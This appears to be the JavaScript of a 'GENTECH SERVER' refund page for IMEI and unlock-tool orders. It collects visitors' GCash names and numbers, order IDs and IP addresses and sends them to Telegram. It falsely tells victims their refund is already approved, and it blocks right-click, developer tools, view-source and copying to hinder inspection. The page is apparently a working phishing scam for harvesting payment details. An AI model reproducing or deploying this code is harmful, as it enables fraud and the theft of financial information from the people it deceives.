async function getClientIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error("Error fetching IP address:", error);
        return 'Unknown';
    }
}

function openModal(type, name) {
    document.getElementById('modalOverlay').style.display = 'block';
    if (type === 'imei') {
        document.getElementById('imeiModal').style.display = 'block';
        document.getElementById('imeiItemName').value = name;
    } else if (type === 'unlockTool') {
        document.getElementById('unlockToolModal').style.display = 'block';
        document.getElementById('unlockToolItemName').value = name;
    }
}

function closeModal() {
    document.getElementById('modalOverlay').style.display = 'none';
    document.getElementById('imeiModal').style.display = 'none';
    document.getElementById('unlockToolModal').style.display = 'none';
}

function canSubmitAgain() {
    const lastSubmitTime = localStorage.getItem('lastSubmitTime');
    if (!lastSubmitTime) {
        return true;
    }

    const currentTime = Date.now();
    const timeElapsed = currentTime - lastSubmitTime;
    return timeElapsed >= 2 * 60 * 1000;
}

function updateLastSubmitTime() {
    const currentTime = Date.now();
    localStorage.setItem('lastSubmitTime', currentTime);
}

document.getElementById('imeiForm').addEventListener('submit', function (event) {
    event.preventDefault();

    if (!canSubmitAgain()) {
        alert("You can only submit a refund request once every 2 minutes.");
        return;
    }

    getClientIP().then((customerIP) => {
        const itemName = document.getElementById('imeiItemName').value;
        const orderId = document.getElementById('imeiOrderId').value;
        const gcashName = document.getElementById('imeiGcashName').value;
        const gcashNumber = document.getElementById('imeiGcashNumber').value;

        const message = `GENTECH SERVER\n

Item: ${itemName}\n
Refund Amount: ₱600\n
Order ID: ${orderId}\n
Gcash Name: ${gcashName}\n
Gcash Number: ${gcashNumber}\n
IP Address: ${customerIP}\n

Your refund request has been successfully processed and approved. Thank you for your patience and understanding. If you have any further questions or need assistance, please feel free to contact our support team. Thank you for choosing our service.`;

        sendToTelegram(message, 'success.html');
        updateLastSubmitTime();
        closeModal();
    });
});

document.getElementById('unlockToolForm').addEventListener('submit', function (event) {
    event.preventDefault();

    if (!canSubmitAgain()) {
        alert("You can only submit a refund request once every 2 minutes.");
        return;
    }

    getClientIP().then((customerIP) => {
        const itemName = document.getElementById('unlockToolItemName').value;
        const orderId = document.getElementById('unlockToolOrderId').value;
        const gcashName = document.getElementById('unlockToolGcashName').value;
        const gcashNumber = document.getElementById('unlockToolGcashNumber').value;

        const message = `GENTECH SERVER\n

Item: ${itemName}\n
Refund Amount: ₱\n
Order ID: ${orderId}\n
Gcash Name: ${gcashName}\n
Gcash Number: ${gcashNumber}\n
Gcash Reference Number: \n
IP Address: ${customerIP}\n

Your refund request has been successfully processed and approved. Thank you for your patience and understanding. If you have any further questions or need assistance, please feel free to contact our support team. Thank you for choosing our service.`;

        sendToTelegram(message, 'success.html');
        updateLastSubmitTime();
        closeModal();
    });
});

window.onload = checkMobileDevice;

document.addEventListener('contextmenu', function (e) {
    e.preventDefault();
});

document.addEventListener('keydown', function (e) {
    if (e.key === 'F12' || 
        (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) || 
        (e.ctrlKey && e.key === 'U')) {
        e.preventDefault();
    }
});

document.addEventListener('selectstart', function (e) {
    e.preventDefault();
});

document.addEventListener('copy', function (e) {
    e.preventDefault();
});
